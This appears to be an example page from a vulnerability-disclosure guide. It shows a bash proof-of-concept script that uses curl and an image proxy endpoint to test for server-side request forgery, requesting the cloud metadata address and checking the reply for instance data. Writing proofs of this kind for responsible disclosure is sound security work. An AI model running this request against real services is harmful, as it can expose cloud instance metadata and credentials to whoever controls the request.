# Example: SSRF PoC (curl)

Sometimes a single curl command is the most effective PoC. This example demonstrates the
**minimum viable proof** principle — one request is enough to prove the vulnerability.

**Scenario:** An image proxy endpoint fetches user-supplied URLs without restriction,
allowing an attacker to read cloud metadata.

**Approach:** Mono-flow bash script with curl.

```bash
#!/usr/bin/env bash
# == [ Header ] ==
# Title:     SSRF via unrestricted image proxy
# Affected:  GET /api/proxy?url= (image-service v2.1.3)
# Impact:    Read cloud instance metadata (AWS/GCP credentials)
# Author:    researcher

set -euo pipefail

# == [ Set Up ] ==
TARGET="${1:-http://localhost:8080}"
ENDPOINT="${TARGET}/api/proxy"
METADATA_URL="http://169.254.169.254/latest/meta-data/"

# == [ Execute Exploit ] ==
echo "[*] Requesting metadata via image proxy..."
RESPONSE=$(curl -s -o - -w "\n%{http_code}" \
  "${ENDPOINT}?url=${METADATA_URL}")

HTTP_CODE=$(echo "$RESPONSE" | tail -1)
BODY=$(echo "$RESPONSE" | sed '$d')

# == [ Verify Impact ] ==
if [ "$HTTP_CODE" = "200" ] && echo "$BODY" | grep -q "ami-id\|instance-id\|hostname"; then
  echo "[+] Vulnerability confirmed: proxy returned cloud metadata"
  echo "    Response body (first 5 lines):"
  echo "$BODY" | head -5 | sed 's/^/    /'
  exit 0
else
  echo "[-] Target does not appear vulnerable (HTTP ${HTTP_CODE})"
  exit 1
fi
```

## Why This PoC Works

- **Minimum viable proof.** A single curl request proves the server fetches arbitrary
  internal URLs. No additional complexity needed.
- **Parameterized target.** `TARGET` defaults to localhost and is overridable via CLI
  argument. No hardcoded production URLs.
- **Benign payload.** Reads metadata — does not exfiltrate, modify, or destroy anything.
  The metadata URL is the standard canary for SSRF testing.
- **Clear output.** `[+]` / `[-]` prefix makes success or failure unambiguous. Prints
  partial response body so the reviewer sees real evidence.
- **Trivially reproducible.** A maintainer can copy this script and run it against their
  staging environment in seconds.
